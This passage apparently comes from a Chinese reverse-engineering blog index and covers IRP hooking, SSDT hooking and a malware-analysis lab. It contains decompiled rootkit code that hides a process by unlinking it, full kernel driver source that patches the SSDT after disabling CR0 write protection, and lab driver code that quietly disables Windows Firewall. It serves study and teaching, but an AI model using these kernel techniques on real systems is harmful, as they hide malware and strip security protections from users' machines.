14（0xE)），随后调用IoCreateSymbolicLink创建一个名为”\\DosDevices\\ProcHelper”的符号链接，来供用户态应用程序访问。\n12345678910111213141516171819202122232425NTSTATUS __stdcall sub_10706(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;  NTSTATUS result; // eax@1  NTSTATUS v3; // esi@2  UNICODE_STRING SymbolicLinkName; // [sp+8h] [bp-14h]@2  UNICODE_STRING DestinationString; // [sp+10h] [bp-Ch]@1  PDEVICE_OBJECT DeviceObject; // [sp+18h] [bp-4h]@1  DeviceObject = 0;  RtlInitUnicodeString(&amp;DestinationString, L&quot;\\\\Device\\\\ProcHelper&quot;);  result = IoCreateDevice(DriverObject, 0, &amp;DestinationString, 0x22u, 0x100u, 0, &amp;DeviceObject);  if ( result &gt;= 0 )  &#123;    DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)sub_10606;    DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = (PDRIVER_DISPATCH)sub_10606;    DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)sub_10666;    DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)sub_1062A;    RtlInitUnicodeString(&amp;SymbolicLinkName, L&quot;\\\\DosDevices\\\\ProcHelper&quot;);    v3 = IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DestinationString);    if ( v3 &lt; 0 )      IoDeleteDevice(DeviceObject);    result = v3;  &#125;  return result;&#125;\n\n对于DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] &#x3D; (PDRIVER_DISPATCH)sub_10666;，这个就是 处理DeviceIoControl请求的驱动代码，查看函数sub_10666，发现其首先调用IoGetCurrentProcess，它返回调用 DeviceIoControl进程的EPROCESS结构，然后访问偏移量0x88处的数据，再访问偏移量0x8C处的数据。在Windows XP中，位于PEB结构偏移量为0x88的是一个LIST_ENTRY结构体，它是包含两个值的双向链表：第一个是BLink，指向列表中的前一项，第二个是FLink，指向列表的下一项。\n本例中，0x88是链表第一个LIST_ENTRY结构体的BLink，0x8C是是链表第一个LIST_ENTRY结构体的FLink。\n此处代码的作用是通过从加载进程的列表中解除链接，来隐藏当前进程。\n12345678910111213141516171819202122232425PAGE:00010666 ; int __stdcall sub_10666(int, PIRP Irp)PAGE:00010666 sub_10666       proc near               ; DATA XREF: sub_10706+54oPAGE:00010666PAGE:00010666 Irp             = dword ptr  0ChPAGE:00010666PAGE:00010666                 mov     edi, ediPAGE:00010668                 push    ebpPAGE:00010669                 mov     ebp, espPAGE:0001066B                 call    ds:IoGetCurrentProcessPAGE:00010671                 mov     ecx, [eax+8Ch]PAGE:00010677                 add     eax, 88hPAGE:0001067C                 mov     edx, [eax]PAGE:0001067E                 mov     [ecx], edxPAGE:00010680                 mov     ecx, [eax]PAGE:00010682                 mov     eax, [eax+4]PAGE:00010685                 mov     [ecx+4], eaxPAGE:00010688                 mov     ecx, [ebp+Irp]  ; IrpPAGE:0001068B                 and     dword ptr [ecx+18h], 0PAGE:0001068F                 and     dword ptr [ecx+1Ch], 0PAGE:00010693                 xor     dl, dl          ; PriorityBoostPAGE:00010695                 call    ds:IofCompleteRequestPAGE:0001069B                 xor     eax, eaxPAGE:0001069D                 pop     ebpPAGE:0001069E                 retn    8PAGE:0001069E sub_10666       endp\n\n\n\n参考链接https://cata1oc.github.io/2020/04/12/3%E7%8E%AF%E4%B8%8E0%E7%8E%AF%E9%80%9A%E4%BF%A1%EF%BC%88%E5%B8%B8%E8%A7%84%E6%96%B9%E5%BC%8F%EF%BC%89/\nhttps://cata1oc.github.io/2020/04/14/%E5%88%9D%E6%8E%A2IRP/\n","slug":"IRP Hook","date":"2022-03-27T07:18:13.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理,API hook,IRP","author_index":"0netry"},{"id":"6b2dac661e4ecb3d25144597b91ee96f","title":"SSDT Hook","content":"内核态代码只能被用户态的SYSCALL、SYSENTER或INT 0x2E指令来访问\n程序进入0环后，有一个保存现场的过程，会将3环的各种寄存器都保存到一个叫做_Trap_Frame的结构体中。在3环部分，程序将一个编号存到了eax中，这个编号叫做系统服务号，此外，在保存现场的过程中，程序还让edx指向了3环第一个参数的地址。\n系统服务表在分析代码前，我们先来学习一个结构，系统服务表（System Service Table）\n\n在Windows XP系统下，系统服务表有两张，这两张表存着内核文件的导出函数（不包括内核文件的所有函数，主要是3环函数常用的内核函数）。第一张表导出的内核函数主要来源于ntoskrl.exe，实现大部分3环函数基本功能；第二张表导出的内核函数主要来源于win32k.sys，主要实现图形界面相关功能（例如GDI32.dll的底层实现）。\n系统服务表结构根据示例图，我们先简单认识一下系统服务表，先从结构看起：\n\nServiceTable：指向一个函数地址表，通过系统服务号可以在函数地址表中找到指定的内核函数。\nCount：指当前系统服务表被调用的次数。\nServiceLimit：函数地址表的大小，即系统服务函数的个数\nArgmentTable：系统服务函数参数的大小，以字节为单位，每个成员大小为1个字节。\n\n系统服务表位置这个系统服务表位于KTHREAD结构的0xE0偏移处。这样，在进入0环后我们可以通过fs:[0]找到KPCR结构，然后在KPCR-&gt;0x124找到当前线程的KTHREAD结构，再根据KTHREAD-&gt;0xE0就可以找到当前线程所拥有的系统服务表。（还是要说明一点KTHREAD这个结构体是未文档化的，所以里面的数据随着系统版本的不同各个字段偏移就有可能不同，所以使用前最好用windbg命令dt _KThread 确认下所需要的字段偏移。）\n1fs:[0] -&gt; KPCR -&gt; KPCR+0x124 -&gt; KTHREAD -&gt; KTHREAD+0xE0 -&gt; 系统服务表\n\n系统服务号系统服务号用来定位所要寻找的系统服务表的函数。\n\n系统服务号只有低13位是有用的\n\n下标12：判断去查服务表，0去查第一张表；1去查第二张表\n下标0~11：函数地址表的索引\n\nSSDT前文提到了，我们可以通过fs找到KPCR，在通过KPCR找到KTHREAD，然后在KTHREAD+0xE0处找到系统服务表，这里再介绍另一种找到系统服务表的办法，通过SSDT。\nSSDT&amp;SSDT Shadow在Windows内核中设计了两张系统服务描述符表，一张表是上述所说的SSDT，它只保存非用户界面相关的系统服务（例如创建文件、创建进程等）；另一张表称为ShadowSSDT，它专门用于保存和用户界面相关的服务（例如创建窗口等），这两张表在内核中都使用了同一个结构体的表示：\n12345678//系统服务表typedef struct _KSYSTEM_SERVICE_TABLE&#123;    PULONG ServiceTableBase;       //函数地址表的首地址    PULONG ServiceCounterTableBase;//函数表中每个函数被调用的次数    ULONG  NumberOfService;        //服务函数的个数    ULONG  ParamTableBase;         //参数个数表首地址&#125;KSYSTEM_SERVICE_TABLE;\n\n但实际上系统共有4个系统服务描述符，其中2个就是上述的2张表，另外2个没有被使用，可能是留着将来备用的。他们用如下结构体表示：\n12345678//服务描述符typedef struct _KSERVICE_TABLE_DESCRIPTOR&#123;    KSYSTEM_SERVICE_TABLE ntoskrnl;//ntoskrnl.exe的服务函数,即SSDT    KSYSTEM_SERVICE_TABLE win32k;  //win32k.sys的服务函数,即ShadowSSDT    KSYSTEM_SERVICE_TABLE notUsed1;//暂时没用1    KSYSTEM_SERVICE_TABLE notUsed2;//暂时没用2&#125;KSERVICE_TABLE_DESCRIPTOR;\n\nSSDT（System Services Descriptor Table）系统服务描述符表，在这个结构中包含4个成员，每个成员都是一个系统服务表的结构体，可以在Windbg中通过dd KeServiceDescriptorTable指令进行查看（在程序中可以直接声明全局变量KeServiceDescriptorTable，从而找到系统服务表。）：\n\n我们可以看到第一个成员的ServiceTable，Count，ServiceLimit，ArgmentTable字段，Windows Xp只使用了2张表，所以第三个和第四个成员的位置是空的，此外，由于SSDT第二个成员是未导出的，所以第二个成员的位置也是空的。这里介绍一个新的指令，dd KeServiceDescriptorTableShadow，通过全局变量KeServiceDescriptorTableShadow可以查看两张完整的系统服务表。\n\n但是，全局变量KeServiceDescriptorTableShadow也是未导出的，在实际写程序时，不能通过直接访问win32k.sys导出的第二张系统服务表的函数地址，因为里面的函数地址都是无效的。原因是，win32k.sys导出的第二张系统服务表只有在当前进程访问GDI相关的API时，里面的函数地址表才会挂载到物理页上。如果进程没有用到GDI相关的API，那么第二张系统服务表里面的函数地址表就不会挂载到物理内存，那么里面的函数也无效。\n内核函数查找有了SSDT表，我们查找3环API对应的内核函数就很简单了，拿3环API函数ReadProcessMemory举例，在进入0环之前，给eax赋值了一个系统服务号0xba（Win XP），那我们就用这个ba来查看这个这个函数在内核的实现。\n\n通过这张图，可以很清晰的看出来，ReadProcessMemory所实现的功能，在底层是由一个叫做NtReadVirtualMemory完成的。\n总结API函数的调用过程，从3环进入0环，再到找到对应的内核函数，这部分到这就差不多了，当然，真正的调用过程并没有到此结束，因为调用完0环的函数，总得返回3环呀！只是这部分需要用到APC的知识点，因此这里还不能完整实现。此外，在API函数调用这块，还有个小实验，在SSDT表中追加一个函数地址(NtReadVirtualMemory),自己编写API的3环部分调用这个新增的函数(注意：使用2-9-9-12分页，10-10-12会蓝屏)，就留到后面补上了\n函数服务号查找中的问题及解决方案Windbg——ReadVirtual: not properly sign extended在使用Windbg对windows系统进行内核调试时，查看SSDT表某个函数，如NtQuerySystemInformation的函数地址时，提示如下：\n如：\n123456789100: kd&gt; u 8404a48eReadVirtual: 8404a48e not properly sign extended8404a48e 8bff            mov     edi,edi8404a490 55              push    ebp8404a491 8bec            mov     ebp,esp8404a493 8b5508          mov     edx,dword ptr [ebp+8]8404a496 83fa53          cmp     edx,53h8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)8404a49d 83fa08          cmp     edx,8\n\n1、这个问题是由于你正在尝试反汇编一个使用 32 位地址的内核代码，但你的 windbg 配置成了对 64 位地址进行解码。在 Windows 的 x64 架构上，所有内核模式的地址都是在高位 32 位的地址空间，也就是说，如果一个内核地址是合法的，它的高位应该是全 1 或全 0。所以当你尝试去反汇编一个低位 32 位地址的代码时，windbg 认为这个地址没有被正确地符号扩展，于是就抛出了这个错误。\n解决这个问题的办法是将 32 位的地址扩展为 64 位的地址。假设你的地址是 0x8404a48e，你可以尝试将其扩展为 0xffffffff8404a48e，然后再使用 u 命令进行反汇编。\n123456789100: kd&gt; u ffffffff8404a48ent!NtQuerySystemInformation:8404a48e 8bff            mov     edi,edi8404a490 55              push    ebp8404a491 8bec            mov     ebp,esp8404a493 8b5508          mov     edx,dword ptr [ebp+8]8404a496 83fa53          cmp     edx,53h8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)8404a49d 83fa08          cmp     edx,8\n\n2、在WinDbg中打开文件菜单，选择 “Symbol File Path”。加载符号文件：\n在 “Symbol search path” 对话框中，输入以下内容：\n1srv*c:\\symbols*https://msdl.microsoft.com/download/symbols\n\n这将设置 WinDbg 以从 Microsoft 的 symbol 服务器下载 symbol。符号文件将保存在C:\\symbols目录下。\n点击 “OK” 以关闭对话框。\n在WinDbg命令行中，输入以下命令来重新加载symbols：\n1.reload /f\n\n然后你应该可以使用 u 命令来反汇编地址了，例如：\n123456789100: kd&gt; u nt!NTCreateFilent!NtCreateFile:8057d330 8bff            mov     edi,edi8057d332 55              push    ebp8057d333 8bec            mov     ebp,esp8057d335 33c0            xor     eax,eax8057d337 50              push    eax8057d338 50              push    eax8057d339 50              push    eax8057d33a ff7530          push    dword ptr [ebp+30h]\n\n使用WinDbg获取SSDT 系统服务描述表的函数服务号(索引)今天研究了一下午SSDT的东东，最尴尬的是起初我不知道如何获取到SSDT的函数服务号，而这个玩意儿在不同版本的windows是不一样的，后面经过研究还是找到了正确的方法.这里简单的分享一下.\n·  先用个图温习一下Win32API的调用流程吧\n这里以函数QuerySystemInformation为例\n \n·  使用WinDbg获取SSDT函数表对应的索引\n要知道Ntdll.dll中的Win32 API只是一个外壳而已，当从Ring3进入Ring0的时候会将所需要的SSDT索引放入到寄存器EAX中去，所以我们只需要获取到EAX的内容就可以知道函数对应的服务号了.\n好的，我们开始吧，首先打开你的WinDbg，我们以函数QuerySystemInformation为例，我们输入：\n12345678910110: kd&gt; u nt!ZwQuerySystemInformationnt!ZwQuerySystemInformation:83e4b044 b805010000      mov     eax,105h83e4b049 8d542404        lea     edx,[esp+4]83e4b04d 9c              pushfd83e4b04e 6a08            push    883e4b050 e855140000      call    nt!KiSystemService (83e4c4aa)83e4b055 c21000          ret     10hnt!ZwQuerySystemInformationEx:83e4b058 b806010000      mov     eax,106h83e4b05d 8d542404        lea     edx,[esp+4]\n\n看到了吧，mov eax 105h，也就是说我们的服务号是105h.\n但有时候使用u nt!fnction命令查不到，因为0环和三环函数名不一样，如ReadProcessMemory函数三环的函数名未为nt!NtReadVirtualMemory，此时应使用u nt!ZwReadVirtualMemory来查。最完整的方式是通过x32dbg-&gt;符号-&gt;ntdll.dll-&gt;查找function-&gt;双击跳转直到遇到mov easx,num且该命令下面是进入0环的三种方式之一。\n来验证一下，看看是不是函数NtQuerySystemInformation。\n我们先获取到SSDT的地址：\n1234567890: kd&gt; dd KeServiceDescriptorTable83f81b00  83e77e3c 00000000 00000191 83e7848483f81b10  00000000 00000000 00000000 0000000083f81b20  779855dd 779855b4 00000000 005e6c0783f81b30  841e45b8 8414d4f4 83eed107 0000000083f81b40  83e77e3c 00000000 00000191 83e7848483f81b50  95266000 00000000 00000339 9526702c83f81b60  011b4415 0000005d 00000011 0000010083f81b70  5385d2ba d717548f 00000000 00000000\n\n可以看到SSDT的地址是 83e77e3c\n然后通过服务号计算一下SSDT表中这个服务的位置。\nAddress &#x3D; SSDT+4*服务号\n我们得到结果为:0x83e77e3c + 4*0x105 &#x3D; 0x83EC11B0\n可以使用如下命令查看函数地址\n1234567890: kd&gt; dd 83e77e3c+105*483e78250  8404a48e 84083631 84091f0a 8412986283e78260  84006048 84064f79 840767bd 8407103a83e78270  840156b2 8401186c 83e53ccc 83ff067e83e78280  8407cd82 83fb0904 841109ea 840e5cd583e78290  8407a922 8410ffb2 83fc0b43 83fc23df83e782a0  841123ba 840fa3e2 8404a8a7 84042db983e782b0  8402ce29 83e8ce1c 8401f579 8401a4cf83e782c0  840c9289 840b72ac 84112056 840b6dfe\n\n我们得到函数的地址是 8404a48e\n在使用u命令:\n123456789101112131415161718190: kd&gt; u 8404a48e    8404a48e 8bff            mov     edi,edi8404a490 55              push    ebp8404a491 8bec            mov     ebp,esp8404a493 8b5508          mov     edx,dword ptr [ebp+8]8404a496 83fa53          cmp     edx,53h8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)8404a49d 83fa08          cmp     edx,80: kd&gt; u ffffffff8404a48e  //如果直接使用地址不显示，则在地址前面加8个fnt!NtQuerySystemInformation:8404a48e 8bff            mov     edi,edi8404a490 55              push    ebp8404a491 8bec            mov     ebp,esp8404a493 8b5508          mov     edx,dword ptr [ebp+8]8404a496 83fa53          cmp     edx,53h8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)8404a49d 83fa08          cmp     edx,8\n\n看到了吧，我们成功的找到了函数NtQuerySystemInformation的地址.也就是说我们的服务号是正确的.\nSSDT hook使用PsGetCurrentThread()函数可获取当前KTHREAD的首地址。但是需要注意的是SSDT表所在的内存页属性是只读，没有写入的权限，所以需要把该地址设置为可写入，这样才能写入自己的函数。我使用的是CR0寄存器关闭只读属性简单介绍下CR0寄存器:可以看到这里使用32位寄存器，而在CR0寄存器中，我们重点关注的是3个标志位：PE ­ 是否启用保护模式,置1则启用。PG ­ 是否使用分页模式, 置1则开启分页模式, 此标志置1时, PE 标志也必须置1,否则CPU报异常。WP ­ WP为1 时, 不能修改只读的内存页 , WP为0 时, 可以修改只读的内存页。\n所以在进行HOOK时，只要把CR0寄存器中的WP位置为0，就能对内存进行写入操作。操作代码如下\n12345678910//关闭页只读保护__asm    &#123;        push eax;        mov eax, cr0;        and eax, ~0x10000;        mov cr0, eax;        pop eax;        ret;    &#125;\n\n当然使用完成后要把只读保护属性还回去，不然会引发不可预料的严重后果\n12345678910//开启页只读保护__asm    &#123;        push eax;        mov eax, cr0;        or eax, 0x10000;        mov cr0, eax;        pop eax;        ret;    &#125;\n\n有了以上分析的基础那么现在就可以写安装内核钩子的代码了：\n12345678910111213141516171819//安装钩子void InstallHook()&#123;    //1.获取KTHREAD    PETHREAD pNowThread = PsGetCurrentThread();    //2.获取ServiceTable表，该字段偏移为0xbc    g_pServiceTable = (KSERVICE_TABLE_DESCRIPTOR*)        (*(ULONG*)((ULONG)pNowThread + 0xbc));    //3.保存hook的旧的函数的地址，0xbe为ZwOpenProcess的调用号    g_OldZwOpenProcess = (FuZwOpenProcess)        g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[0xbe];    //4.关闭页只读保护    ShutPageProtect();    //5.写入自己的函数到SSDT表内    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[0xbe]        = (ULONG)MyZwOpenProcess;    //6.开启页只读保护    OpenPageProtect();&#125;\n\n看一下自己写的MyZwOpenProcess函数，通过对比PID找到要保护的进程，并且是以结束进程权限PROCESS_TERMINATE（0x1）访问时，则修改权限为0使其无法访问。就达到了保护进程的目的。\n12345678910111213141516171819202122//自写的函数NTSTATUS NTAPI MyZwOpenProcess(    _Out_ PHANDLE ProcessHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _In_opt_ PCLIENT_ID ClientId)&#123;    //当此进程为要保护的进程时，并且是以结束进程权限访问时    if (ClientId-&gt;UniqueProcess == (HANDLE)g_Pid &amp;&amp;        DesiredAccess == PROCESS_TERMINATE)    &#123;        //设为拒绝访问        DesiredAccess = 0;    &#125;    //调用原函数    return g_OldZwOpenProcess(        ProcessHandle,        DesiredAccess,        ObjectAttributes,        ClientId);&#125;\n\n完整源码如下\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#include &lt;ntifs.h&gt; //内核之SSDT-HOOK//系统服务表typedef struct _KSYSTEM_SERVICE_TABLE&#123;    PULONG ServiceTableBase;       //函数地址表的首地址    PULONG ServiceCounterTableBase;//函数表中每个函数被调用的次数    ULONG  NumberOfService;        //服务函数的个数    ULONG ParamTableBase;          //参数个数表首地址&#125;KSYSTEM_SERVICE_TABLE; //服务描述符typedef struct _KSERVICE_TABLE_DESCRIPTOR&#123;    KSYSTEM_SERVICE_TABLE ntoskrnl;//ntoskrnl.exe的服务函数,SSDT    KSYSTEM_SERVICE_TABLE win32k;  //win32k.sys的服务函数,ShadowSSDT    KSYSTEM_SERVICE_TABLE notUsed1;//暂时没用1    KSYSTEM_SERVICE_TABLE notUsed2;//暂时没用2&#125;KSERVICE_TABLE_DESCRIPTOR; //定义HOOK的函数的类型typedef NTSTATUS (NTAPI*FuZwOpenProcess)(    _Out_ PHANDLE ProcessHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _In_opt_ PCLIENT_ID ClientId); //自写的函数声明NTSTATUS NTAPI MyZwOpenProcess(    _Out_ PHANDLE ProcessHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _In_opt_ PCLIENT_ID ClientId); //记录系统的该函数FuZwOpenProcess g_OldZwOpenProcess;//服务描述符表指针KSERVICE_TABLE_DESCRIPTOR* g_pServiceTable = NULL;//要保护进程的IDULONG g_Pid = 9527; //安装钩子void InstallHook();//卸载钩子void UninstallHook();//关闭页写入保护void ShutPageProtect();//开启页写入保护void OpenPageProtect(); //卸载驱动void OutLoad(DRIVER_OBJECT* obj);   ////***驱动入口主函数***/NTSTATUS DriverEntry(DRIVER_OBJECT* driver, UNICODE_STRING* path)&#123;    path;    KdPrint((&quot;驱动启动成功！\\n&quot;));    //DbgBreakPoint();     //安装钩子    InstallHook();     driver-&gt;DriverUnload = OutLoad;    return STATUS_SUCCESS;&#125; //卸载驱动void OutLoad(DRIVER_OBJECT* obj)&#123;    obj;    //卸载钩子    UninstallHook();&#125; //安装钩子void InstallHook()&#123;    //1.获取KTHREAD    PETHREAD pNowThread = PsGetCurrentThread();    //2.获取ServiceTable表    g_pServiceTable = (KSERVICE_TABLE_DESCRIPTOR*)        (*(ULONG*)((ULONG)pNowThread + 0xbc));    //3.保存旧的函数    g_OldZwOpenProcess = (FuZwOpenProcess)        g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[0xbe];    //4.关闭页只读保护    ShutPageProtect();    //5.写入自己的函数到SSDT表内    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[0xbe]        = (ULONG)MyZwOpenProcess;    //6.开启页只读保护    OpenPageProtect();&#125; //卸载钩子void UninstallHook()&#123;    //1.关闭页只读保护    ShutPageProtect();    //2.写入原来的函数到SSDT表内    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[0xbe]        = (ULONG)g_OldZwOpenProcess;    //3.开启页只读保护    OpenPageProtect();&#125; //关闭页只读保护void _declspec(naked) ShutPageProtect()&#123;    __asm    &#123;        push eax;        mov eax, cr0;        and eax, ~0x10000;        mov cr0, eax;        pop eax;        ret;    &#125;&#125; //开启页只读保护void _declspec(naked) OpenPageProtect()&#123;    __asm    &#123;        push eax;        mov eax, cr0;        or eax, 0x10000;        mov cr0, eax;        pop eax;        ret;    &#125;&#125; //自写的函数NTSTATUS NTAPI MyZwOpenProcess(    _Out_ PHANDLE ProcessHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _In_opt_ PCLIENT_ID ClientId)&#123;    //当此进程为要保护的进程时    if (ClientId-&gt;UniqueProcess == (HANDLE)g_Pid &amp;&amp;        DesiredAccess == PROCESS_TERMINATE)    &#123;        //设为拒绝访问        DesiredAccess = 0;    &#125;    //调用原函数    return g_OldZwOpenProcess(        ProcessHandle,        DesiredAccess,        ObjectAttributes,        ClientId);&#125;\n\n《恶意代码分析实战》——Lab10.1静态分析-Lab10-01.exe用IDA查看该程序主函数，发现其主要是调用OpenSCManagerA获取服务管理器句柄，然后调用CreateServiceA，创建一个名为Lab10-01的服务。CreateServiceA调用告诉我们服务使用了”C:\\Windows\\System32\\Lab10-01.sys”中的代码，服务类型为3（SERVICE_KERNEL_DRIVER），这意味着这个文件将被加载到内核。\n如果CreateServiceA调用失败，代码会使用相同的服务名”Lab10-01”调用OpenServiceA，即表示如果因为服务已经存在而导致调用CreateServiceA失败，则打开”Lab10-01”服务的句柄。\n接下来调用StartServiceA来启动服务。\n最后调用ControlService。ControlService的第二个参数是发送控制消息的类型。本例中它的值是SERVICE_CONTROL_STOP（1），这将会卸载驱动，并调用驱动的卸载函数。\n1234567891011121314151617181920212223242526272829303132333435int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)&#123;  int result; // eax@1  void *v5; // edi@1  SC_HANDLE v6; // esi@2  struct _SERVICE_STATUS ServiceStatus; // [sp+4h] [bp-1Ch]@5  result = (int)OpenSCManagerA(0, 0, 0xF003Fu);  v5 = (void *)result;  if ( result )  &#123;    v6 = CreateServiceA(           (SC_HANDLE)result,           &quot;Lab10-01&quot;,           &quot;Lab10-01&quot;,           0xF01FFu,           1u,           3u,           1u,           &quot;C:\\\\Windows\\\\System32\\\\Lab10-01.sys&quot;,           0,           0,           0,           0,           0);    if ( v6 || (v6 = OpenServiceA(v5, &quot;Lab10-01&quot;, 0xF01FFu)) != 0 )    &#123;      StartServiceA(v6, 0, 0);      if ( v6 )        ControlService(v6, SERVICE_CONTROL_STOP, &amp;ServiceStatus);    &#125;    result = 0;  &#125;  return result;&#125;\n\n静态分析-Lab10-01.sys使用IDA分析驱动，可以看到sub_10906函数中将sub_10486函数地址赋值给了DriverObject-&gt;DriverUnload。\n而sub_10486函数中，则调用三次 RtlCreateRegistryKey函数创建了一些注册表键，然后调用两次RtlWriteRegistryValue函数，在两个地方设置EnableFirewall值为0。从内核禁用防火墙的这种方法难以被安全程序探测到。\n其中，当从内核态访问注册表时，前缀\\Registry\\Machine等同于用户态程序访问的HKEY_LOCAL_MACHINE。\n123456789101112131415161718192021222324252627282930313233343536NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;  sub_10920();  return sub_10906(DriverObject, RegistryPath);&#125;NTSTATUS __stdcall sub_10906(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;  DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)sub_10486;  return 0;&#125;NTSTATUS __stdcall sub_10486(int a1)&#123;  int ValueData; // [sp+Ch] [bp-4h]@1  ValueData = 0;  RtlCreateRegistryKey(0, L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft&quot;);  RtlCreateRegistryKey(0, L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall&quot;);  RtlCreateRegistryKey(0, L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile&quot;);  RtlCreateRegistryKey(0, L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile&quot;);  RtlWriteRegistryValue(    0,    L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile&quot;,    &amp;ValueName,    4u,    &amp;ValueData,    4u);  return RtlWriteRegistryValue(           0,           L&quot;\\\\Registry\\\\Machine\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile&quot;,           &amp;ValueName,           4u,           &amp;ValueData,           4u);&#125;\n\n\n\n使用windbg分析Lab10-01.sys首先将Lab10-01.sys复制到C:\\Windows\\System32\\Lab10-01.sys路径然后再进行实验\n我们可以使用Windbg检查Lab10-01.sys，来查看当前调用ControlService卸载驱动时会发生什么事情。用户空间可执行程序（Lab10-01.exe）的代码加载Lab10-01.sys，然后立即卸载它。如果我们在运行恶意可执行程序之前使用内核调试器，因为此时驱动还未在内核中，所以不能检查它。但是，等应用程序运行完成，那时驱动又已经从内存中卸载了。\n为了在Lab10-01.sys载入内存后，使用Windbg分析它，在虚拟机中，将可执行程序（Lab10-01.exe）载入x32dbg中，然后在驱动加载和卸载之间设置断点（在call ControlService时）并运行，一旦程序在断点处暂停，就回到内核调试器（Break）。\n![在call ControlService处设置断点](.&#x2F;《恶意代码分析实战》——Lab10.1&#x2F;在call ControlService处设置断点.png)\n我们知道要分析的服务叫”Lab10-01”，可以通过使用命令!drvobj来获取驱动对象：\n123456780: kd&gt; !drvobj Lab10-01Driver object (871df558) is for: \\Driver\\Lab10-01Driver Extension List: (id , addr)Device Object list:\n\n\n\n\n\n\n\n\n\n\n为了解决任何难以定位的服务名，可以使用!object \\Driver命令获取当前内核驱动对象列表\n通过命令!drvobj可以获取驱动对象的地址（871df558）。因为在设备对象列表中没有设备列出，所以这个驱动没有供用户空间程序访问的设备。\n一旦获得驱动对象的地址，可以使用dt命令查看它：\n12345678910111213141516170: kd&gt; dt _DRIVER_OBJECT 871df558nt!_DRIVER_OBJECT   +0x000 Type             : 0n4   +0x002 Size             : 0n168   +0x004 DeviceObject     : (null)    +0x008 Flags            : 0x12   +0x00c DriverStart      : 0x95197000 Void   +0x010 DriverSize       : 0xe80   +0x014 DriverSection    : 0x85ed3ec0 Void   +0x018 DriverExtension  : 0x871df600 _DRIVER_EXTENSION   +0x01c DriverName       : _UNICODE_STRING &quot;\\Driver\\Lab10-01&quot;   +0x024 HardwareDatabase : 0x8418c270 _UNICODE_STRING &quot;\\REGISTRY\\MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM&quot;   +0x028 FastIoDispatch   : (null)    +0x02c DriverInit       : 0x95197959     long  +0   +0x030 DriverStartIo    : (null)    +0x034 DriverUnload     : 0x95197486     void  +0   +0x038 MajorFunction    : [28] 0x83ec279b     long  nt!IopInvalidDeviceRequest+0\n\n尝试确定驱动卸载时调用的函数——偏移量0x034的信息DriverUnload，然后使用入以下命令设置一个断点：\n1230: kd&gt;bp 0x95197486或0: kd&gt;bp 0xffffffff95197486 \n\n设置断点后，恢复内核运行（g）。然后回到虚拟机中运行x32dbg。由于在内核调试器命中了断点，整个Guest OS会卡死。此时，回到内核调试器（Break）并且单步运行，可以看到几处call esi\n使用下面命令查看esi所指的函数为nt!RtlCreateRegistryKey和：\n123456789101112131415161718192021222324250: kd&gt; r esiesi=83fa52460: kd&gt; u ffffffff83fa5246nt!RtlCreateRegistryKey:83fa5246 8bff            mov     edi,edi83fa5248 55              push    ebp83fa5249 8bec            mov     ebp,esp83fa524b 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]83fa524e 8b5508          mov     edx,dword ptr [ebp+8]83fa5251 8d450c          lea     eax,[ebp+0Ch]83fa5254 50              push    eax83fa5255 6a01            push    10: kd&gt; r esiesi=83fe62180: kd&gt; u ffffffff83fe6218nt!RtlWriteRegistryValue:83fe6218 8bff            mov     edi,edi83fe621a 55              push    ebp83fe621b 8bec            mov     ebp,esp83fe621d 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]83fe6220 8b5508          mov     edx,dword ptr [ebp+8]83fe6223 83ec0c          sub     esp,0Ch83fe6226 56              push    esi83fe6227 8d450c         